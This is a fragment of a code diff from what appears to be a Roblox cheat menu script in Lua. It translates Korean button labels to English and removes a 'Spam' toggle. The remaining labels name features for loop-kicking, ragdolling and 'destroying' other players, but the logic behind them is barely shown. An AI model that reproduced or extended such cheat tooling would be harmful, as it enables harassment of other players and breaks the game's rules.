+    Name = "Loop kickV2   <font color='rgb(0,0,255)'>[Ownership]</font>   <font color='rgb(255,0,0)'>[Spam]</font>",
     Default = false,
     --Flag = "OwnershipKickLoopV2",
     Callback = function(Value)
@@ -9794,7 +9847,7 @@ playersInLoop2V = playersInLoop2V or {}
 local palletRagdollTask = nil
 
 LoopTab:AddToggle({
-    Name = "래그돌 타겟",
+    Name = "",
     Flag = "OwnershipPalletRagdoll",
     Default = false,
     Callback = function(v)
@@ -9940,20 +9993,12 @@ LoopTab:AddToggle({
 
 end
 LoopTab:AddSection({
-    Name = "스팸"
-})
-LoopTab:AddToggle({
-    Name = "스팸  <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    Default = false,
-    Flag = "27y9hw",
-    Callback = function(Value)
-        LoopSnowBallT = Value
-        LoopSnowBallF()
-    end
+    Name = "Spam"
 })
 
+
 LoopTab:AddButton({
-    Name = "블랙홀  <font color='rgb(0,0,0)'>[닌자 쿠나이]</font>",
+    Name = "destroy  <font color='rgb(0,0,0)'>[Ninja Kunai]</font>",
     Callback = function()
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
